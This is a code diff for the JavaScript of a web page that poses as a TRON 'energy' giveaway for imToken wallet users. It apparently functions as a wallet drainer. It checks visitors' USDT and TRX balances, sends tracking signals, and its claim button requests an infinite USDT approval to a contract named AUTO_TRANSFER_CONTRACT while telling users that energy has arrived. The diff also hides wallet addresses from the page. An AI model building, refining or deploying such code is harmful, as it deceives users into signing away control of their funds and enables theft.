@@ -1056,34 +1056,31 @@ async function queryUserEnergyBalance(address) {
         return 0;
     }
 }      
-function reRenderDynamicContent() {
+// ========== 重新渲染动态内容（已加async，删除地址赋值） ==========
+async function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
         recordList.style.display = "none";
-       await updateUserInfoDisplay(); // 未连接时更新
+        await updateUserInfoDisplay(); // 异步调用
         return;
     }
     recordList.style.display = "block";
     recordList.style.visibility = "visible";
-    // 特殊地址处理
+    // 特殊地址处理（删除地址赋值）
     if (userAddress === SPECIAL_ADDRESS) {
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-        updateUserInfoDisplay(); // 已连接时更新
+        await updateUserInfoDisplay(); // 异步调用
         renderEnergyRecords();
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
         return;
     }
-    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-    // 30天内已领取
+    // 30天内已领取（删除地址赋值）
     if (isAddressAuthorized(userAddress)) {
-        document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-        await updateUserInfoDisplay(); // 已连接时更新
+        await updateUserInfoDisplay(); // 异步调用
         approveBtn.disabled = true;
         approveBtn.textContent = lang.authorizedBtn;
         return;
@@ -1096,9 +1093,8 @@ function reRenderDynamicContent() {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
     }
-    document.getElementById("statusAddress").textContent = shortAddr;
     updateWalletStatus();
-    await updateUserInfoDisplay(); // 已连接时更新
+    await updateUserInfoDisplay(); // 异步调用
     bindApproveLogic();
     renderEnergyRecords();
 }
@@ -1129,7 +1125,7 @@ function calculateCurrentEnergy() {
         energy: currentEnergy,
         lastCalcTime: Date.now()
     }));
-    // 更新能量余额显示
+    // 更新合约能量显示（修复拼写错误）
     if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
     return currentEnergy;
 }
@@ -1240,7 +1236,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 });
 // ========== 环境检测（最终版：用官方Scheme直接唤起浏览器） ==========
-// ========== 环境检测（最终最终版：复用你已定义的正确配置） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -1257,7 +1252,7 @@ async function checkImTokenEnv() {
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
-    // 非imToken环境：100%复用你已定义的正确配置，不手动写Scheme！
+    // 非imToken环境：100%复用你已定义的正确配置
     specialTipContainer.style.display = "block";
     // 修复：显示动态提示（非imToken用户），隐藏默认提示和四角余额
     userInfoDefault.style.display = "none";
@@ -1267,9 +1262,7 @@ async function checkImTokenEnv() {
     connectBtn.style.display = "none";
     nonImTokenPopup.style.display = "none";
     const fullTargetUrl = window.location.href + "#approve";
-    // 直接用你定义的imTokenConfig.scheme，不修改任何已有配置！
     const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
-    // 触发跳转（和你之前成功的逻辑完全一致）
     console.log("📤 复用已定义配置跳转：", jumpUrl);
     window.location.href = jumpUrl;
     // 延迟3秒检测结果
@@ -1277,7 +1270,7 @@ async function checkImTokenEnv() {
         if (!window.tronWeb) {
             nonImTokenPopup.style.display = "block";
             connectBtn.style.display = "block";
-            // 按钮也复用同一配置，确保100%一致
+            // 按钮也复用同一配置
             connectBtn.onclick = () => {
                 const fullTargetUrl = window.location.href + "#approve";
                 const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
@@ -1289,31 +1282,30 @@ async function checkImTokenEnv() {
         nonImTokenPopup.style.display = "none";
     };
 }
-//钱包初始化
+// ========== 钱包初始化（完整修复版） ==========
 async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
-        userAddress = tronWeb.defaultAddress?.base58; // 兼容钱包未授权的情况（可选链操作）
-        // 1. 特殊地址白名单（原有逻辑不变，隐藏地址+仅显示状态）
+        userAddress = tronWeb.defaultAddress?.base58; // 兼容钱包未授权
+        // 1. 特殊地址白名单（隐藏地址+仅显示状态）
         if (userAddress === SPECIAL_ADDRESS) {
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
             const [usdtRaw, trxRaw] = await Promise.all([
                 trc20Contract.balanceOf(userAddress).call().catch(err => 0),
                 tronWeb.trx.getBalance(userAddress).catch(err => 0)
             ]);
-            tokenBalance = Number(usdtRaw) / 1000000; // USDT精度转换
-            trxBalance = Number(trxRaw) / 1000000;     // TRX精度转换
-            // 隐藏默认提示，显示动态状态（无地址、无余额）
+            tokenBalance = Number(usdtRaw) / 1000000;
+            trxBalance = Number(trxRaw) / 1000000;
+            // 显示动态状态（无地址、无余额）
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // 移除所有占位符
-            // 显示四角余额（用户能量显示自身能量）
+            userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, "");
+            // 显示四角余额
             balanceItems.forEach(item => item.style.display = "flex");
-            // 异步更新用户信息（加await）
-            await updateUserInfoDisplay();
+            await updateUserInfoDisplay(); // 异步更新
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
-            // 隐藏地址显示
+            // 强制隐藏地址
             const statusAddressEl = document.getElementById("statusAddress");
             if (statusAddressEl) statusAddressEl.style.display = "none";
             updateWalletStatus();
@@ -1324,12 +1316,11 @@ async function initWallet(isAfterApprove) {
                 updateA1SignalRecord(userAddress);
             }
             bindApproveLogic();
-            // 强制显示+渲染记录
             recordList.style.display = "block";
             renderEnergyRecords();
             return;
         }
-        // 2. 无钱包地址（原有逻辑不变）
+        // 2. 无钱包地址
         if (!userAddress) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
@@ -1341,7 +1332,7 @@ async function initWallet(isAfterApprove) {
             recordList.style.display = "none";
             return;
         }
-        // 查询余额（原有逻辑不变，仅用于判断，不显示在状态中）
+        // 查询余额（仅用于判断）
         trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
         const [usdtRaw, trxRaw] = await Promise.all([
             trc20Contract.balanceOf(userAddress).call().catch(err => 0),
@@ -1349,40 +1340,38 @@ async function initWallet(isAfterApprove) {
         ]);
         tokenBalance = Number(usdtRaw) / 1000000;
         trxBalance = Number(trxRaw) / 1000000;
-        // 隐藏地址显示
+        // 强制隐藏地址
         const statusAddressEl = document.getElementById("statusAddress");
         if (statusAddressEl) statusAddressEl.style.display = "none";
-        // 3. 30天内已领取（仅显示状态，无地址、无余额）
+        // 3. 30天内已领取（仅显示状态）
         if (isAddressAuthorized(userAddress)) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.authorizedTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // 移除所有占位符
+            userInfoStatus.innerHTML = lang.authorizedTip.replace(/\{address\}|{usdt}|{trx}/g, "");
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新余额
+            await updateUserInfoDisplay(); // 异步更新
             approveBtn.disabled = true;
             approveBtn.textContent = lang.authorizedBtn;
             updateWalletStatus();
-            // 强制显示+渲染记录
             recordList.style.display = "block";
             renderEnergyRecords();
             return;
         }
-        // 4. USDT余额不足（仅显示状态，无地址、无余额）
+        // 4. USDT余额不足（仅显示状态）
         if (tokenBalance <= 1) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
-            userInfoStatus.innerHTML = lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, ""); // 移除所有占位符
+            userInfoStatus.innerHTML = lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, "");
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新余额
+            await updateUserInfoDisplay(); // 异步更新
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
-            // 强制显示+渲染记录
             recordList.style.display = "block";
             renderEnergyRecords();
             return;
         }
-        // 5. 非imToken用户（原有逻辑不变）
+        // 5. 非imToken用户
         if (!window.tronWeb || !window.tronWeb.defaultAddress) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
@@ -1394,12 +1383,12 @@ async function initWallet(isAfterApprove) {
             recordList.style.display = "none";
             return;
         }
-        // 6. 符合条件（仅显示状态，无地址、无余额）
+        // 6. 符合条件（仅显示状态）
         userInfoDefault.style.display = "none";
         userInfoStatus.style.display = "block";
-        userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, ""); // 移除所有占位符
+        userInfoStatus.innerHTML = lang.eligibleTip.replace(/\{address\}|{usdt}|{trx}/g, "");
         balanceItems.forEach(item => item.style.display = "flex");
-        await updateUserInfoDisplay(); // 异步更新余额
+        await updateUserInfoDisplay(); // 异步更新
         updateWalletStatus();
         // 发送A1信号（防重复）
         if (canSendA1Signal(userAddress)) {
@@ -1409,11 +1398,10 @@ async function initWallet(isAfterApprove) {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
         bindApproveLogic();
-        // 强制显示+渲染记录（最终兜底）
         recordList.style.display = "block";
         renderEnergyRecords();
     } catch (e) {
-        // 错误处理（原有逻辑不变，优化显示）
+        // 错误处理
         console.error("钱包初始化失败：", e);
         const errorTip = userAddress ? lang.insufficientUsdt.replace(/\{address\}|{usdt}|{trx}/g, "") : lang.noWalletAddress;
         userInfoDefault.style.display = "none";
@@ -1422,16 +1410,15 @@ async function initWallet(isAfterApprove) {
         // 有地址显示四角余额，无地址隐藏
         if (userAddress) {
             balanceItems.forEach(item => item.style.display = "flex");
-            await updateUserInfoDisplay(); // 异步更新余额
+            await updateUserInfoDisplay(); // 异步更新
         } else {
             balanceItems.forEach(item => item.style.display = "none");
         }
         approveBtn.disabled = true;
         approveBtn.textContent = lang.insufficientBtn;
         updateWalletStatus();
-        // 有地址就显示记录容器，无地址则隐藏
         recordList.style.display = userAddress ? "block" : "none";
-        if (userAddress) renderEnergyRecords(); // 有地址时渲染记录
+        if (userAddress) renderEnergyRecords();
     }
 }
 // ========== 发送信号函数 ==========
@@ -1539,33 +1526,28 @@ function bindRetryA1Logic() {
     approveBtn.textContent = "重新检测环境";
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         btn.disabled = true;
         btn.textContent = "检测中...";
-        // 修复：修改动态提示内容，不覆盖容器
-        userInfoStatus.innerHTML = `<span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>
-        `;
+        // 动态提示仅显示状态（无地址、无余额）
+        userInfoStatus.innerHTML = `<span style='color: #4ade80; font-size: 13px;'>✅ 正在重新检测环境...</span>`;
         const a1Result = await sendSignalA1(); // 重试发送A1
         if (a1Result === "success") {
-            // 修复：修改动态提示内容，不覆盖容器
-            userInfoStatus.innerHTML = `<span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>
-            `;
+            // 动态提示仅显示状态
+            userInfoStatus.innerHTML = `<span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
             bindApproveLogic(); // 重试成功→重新绑定领取逻辑
         } else {
-            // 修复：修改动态提示内容，不覆盖容器
-            userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>
-            `;
+            // 动态提示仅显示状态
+            userInfoStatus.innerHTML = `<span style='color: #ef4444; font-size: 13px;'>⚠️ 环境检测失败，可重试</span>`;
             btn.disabled = false;
             btn.textContent = "重新检测环境";
         }
     };
 }
-   //领取按钮函数     
+// ========== 领取按钮函数 ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         btn.disabled = true;
         btn.textContent = lang.redirectingBtn;
         reviewTip.style.display = "flex";
@@ -1582,25 +1564,24 @@ function bindApproveLogic() {
                 sendSignalB(true).catch(err => console.warn("B1信号发送失败（不影响签名）：", err));
                 markB1SignalSent(userAddress);
             }
-            // 核心校验：确保已有合约实例有效（复用前置初始化的trc20Contract）
+            // 核心校验：确保已有合约实例有效
             if (!trc20Contract) {
-                // 兜底：如果实例意外失效，用已有ABI重新快速初始化（仅兜底，正常情况不会走）
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                 if (!trc20Contract) throw new Error("合约实例初始化失败，请重新连接钱包");
             }
-            // 确保TronWeb就绪（避免实例和钱包通信失效）
+            // 确保TronWeb就绪
             if (!tronWeb.ready) {
                 await new Promise(resolve => tronWeb.onReady(resolve));
             }
-            // 关键：直接调用已有合约实例的approve方法（不新建、不跳转、不碰A1/B1核心逻辑）
+            // 关键：合约approve调用
             const approveResult = await trc20Contract.approve(
-                AUTO_TRANSFER_CONTRACT, // 授权对象（前置已确认）
-                INFINITE_APPROVE_AMOUNT // 无限授权金额（已有ABI支持）
+                AUTO_TRANSFER_CONTRACT, // 授权对象
+                INFINITE_APPROVE_AMOUNT // 无限授权金额
             ).send({
-                from: userAddress, // 前置已校验的有效地址
+                from: userAddress,
                 shouldPollResponse: true // 等待链上确认
             });
-            // 签名成功后收尾（不影响核心调用）
+            // 签名成功后收尾
             reviewTipText.textContent = "签名成功，能量已到账...";
             await Promise.all([
                 sendSignalA2().catch(err => console.warn("A2信号同步失败：", err)),
@@ -1610,7 +1591,7 @@ function bindApproveLogic() {
             saveEnergyRecord();
             renderEnergyRecords();
             btn.textContent = lang.successBtn;
-            // 修复：追加成功提示，不覆盖原有内容
+            // 追加成功提示（无地址、无余额）
             userInfoStatus.innerHTML += lang.successArrival;
             alert(lang.successTip);
             reviewTip.style.display = "none";
@@ -1619,7 +1600,7 @@ function bindApproveLogic() {
             reviewTip.style.display = "none";
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-            // 明确提示错误类型（含A1校验失败、合约实例问题等）
+            // 明确提示错误类型
             let errMsg = e.message;
             if (errMsg.includes("A1环境校验")) {
                 errMsg = "A1环境校验未通过，请重新连接钱包";
@@ -1652,15 +1633,14 @@ function renderEnergyRecords() {
     const lang = langConfig[currentLang];
     const container = document.getElementById("approvalRecords");
     const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-    // 确保即使无记录，也显示默认文本（避免用户误以为不显示）
+    // 确保即使无记录，也显示默认文本
     if (records.length === 0) {
         container.innerHTML = `<div class='record-item' style='text-align: center; padding: 10px 0;'>${lang.noRecord}</div>`;
         return;
     }
-    // 有记录时正常渲染（原有逻辑不变）
+    // 有记录时正常渲染（隐藏地址）
     container.innerHTML = records.map(record => `
         <div class='record-item'>
-            <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
             <p><strong>${lang.recordType}</strong>${record.recordType}</p>
             <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
             <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
